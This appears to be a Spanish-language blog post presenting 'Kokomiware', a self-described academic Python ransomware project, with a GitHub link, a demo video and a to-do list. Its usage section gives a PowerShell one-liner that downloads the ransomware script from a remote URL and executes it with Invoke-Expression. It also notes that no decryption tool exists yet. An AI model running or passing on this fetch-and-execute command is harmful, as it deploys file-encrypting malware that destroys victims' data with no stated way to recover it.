---
title: KOKOMIWARE.
description: Pequeño ejemplo de la implementación de un ransomware en Python.
author: Quantum 
date: 2023-07-11
categories: [Proyectos]
tags: [ransomware,python,ciberseguridad]
image:
  path: /assets/img/projects/kokomiware/header.webp
  alt: Sangonomiya Kokomi.
---

### ¿Qué es Kokomiware?
Kokomiware es un ransomware escrito en el lenguaje de programación python, se hace uso de la librería `cryptography` y librerías nativas de python como lo son `OS` Y `Glob`. Kokomiware tiene como fin demostrar lo fácil que es implementar un malware de este tipo. Además de que su propósito es puramente académico y para estudio de desarrollo de malware, bajo ningún concepto debe de ser utilizado con fines maliciosos y debera ser ejecutado unicamente en maquinas virtuales en entornos controlados. Por ultimo como aclaración no soy un experto en python por lo que pueden surgir bugs. 

**Repositorio de Github:** [Kokomiware](https://github.com/quantumwavves/Kokomi-Russian-Roulette)

### Uso

#### En una sola línea 

Este procedimiento llama a un script en escrito en powershell por medio del `Invoke-RestMethod` a un recurso en línea y utiliza, `Invoke-Expression` para realizar su ejecución, todo a través de un pipe `|`

```console
irm https://raw.githubusercontent.com/quantumwavves/Kokomi-Russian-Roulette/master/bin/oneline/kokomiware-oneline.ps1 | iex
```

#### Modo ruleta rusa

```console
irm https://raw.githubusercontent.com/quantumwavves/Kokomi-Russian-Roulette/master/bin/oneline/kokomiware-oneline.ps1 | iex
```

#### Uso normal 


```console
.\kokomiware.exe
```
#### Desarrollo 

`(Yo recomiendo usar un entorno virtual de python)`{:.info}
```console
$ .\env\Scripts\activate
$ pip install -r requirements.txt
$ python kokomiware-fernet.py
# Versión alternativa con pyAes, mas lenta, pero con un cifrado mas seguro
$ python kokomiware-aes.py
```
### Descifrar archivos (clave)
Kokomiware genera una clave única y aleatoria para cada ejecución de la función kokomi(). Se almacena en un archivo .png en la siguiente ruta `$env:temp` o también conocido como `%temp%` con el nombre `sngmy.png`{:.warning}, El programa de descifrado aun no esta creado.

### Lista de pendientes

- [ ] Reescribir el código en otro lenguaje como `C++` o `C` con el fin de aumentar la velocidad de encriptación.
- [ ] Crear un readme con instrucciones para desencriptar.
- [ ] Crear una función de desencriptación
- [ ] Optimizar los tiempos de ejecución

### Demo

Este es un video de demostración:

<p style="text-align: center">
<video width="600" height="400" controls>
  <source src="/assets/img/projects/kokomiware/demo.webm" type="video/mp4">
</video>
</p>

### Inspiración
- [Sangonomiya Kokomi](https://genshin-impact.fandom.com/wiki/Sangonomiya_Kokomi)
